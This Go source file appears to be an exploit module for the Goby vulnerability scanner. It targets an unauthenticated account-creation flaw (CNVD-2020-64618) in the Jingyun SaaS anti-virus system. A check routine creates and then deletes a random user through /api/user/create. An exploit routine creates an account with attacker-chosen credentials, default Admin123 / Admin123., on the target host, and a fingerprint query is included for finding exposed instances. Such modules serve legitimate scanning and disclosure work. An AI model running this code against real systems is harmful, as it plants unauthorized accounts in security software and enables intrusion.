package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JingYun SasS Api Interface Arbitrary User Create",
    "Description": "Beijing Chenxin Leading Information Technology Co., Ltd. Jingyun network anti-virus system creates arbitrary user vulnerabilities,Passwords must contain numbers, letters, case and special symbols",
    "Product": "Jingyun SaaS",
    "Homepage": "http://www.v-secure.cn/",
    "DisclosureDate": "2021-07-07",
    "Author": "1291904552@qq.com",
    "GobyQuery": "body=\" V-Secure All Right Reserved \"",
    "Level": "2",
    "Impact": "",
    "Recommandation": "",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2020-64618"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "user",
            "type": "input",
            "value": "Admin123"
        },
        {
            "name": "pass",
            "type": "input",
            "value": "Admin123."
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "unauthorized"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "Jingyun SaaS"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10198",
    "Recommendation": ""
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			username := goutils.RandomHexString(4)
			uri := "/api/user/create"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("username=%s&password=Test123.&email=&phone=&note=&type=1&sign=1", username)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"error_code\":0,") {
					uri2 := "/api/user/delete"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg2.Data = "username=" + username
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						return resp2.StatusCode == 200 && strings.Contains(resp2.Utf8Html, "\"error_code\":0,")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			user := ss.Params["user"].(string)
			pass := ss.Params["pass"].(string)
			uri := "/api/user/create"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("username=%s&password=%s&email=&phone=&note=&type=1&sign=1", user, pass)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"error_code\":0,") {
					expResult.Output = "success"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
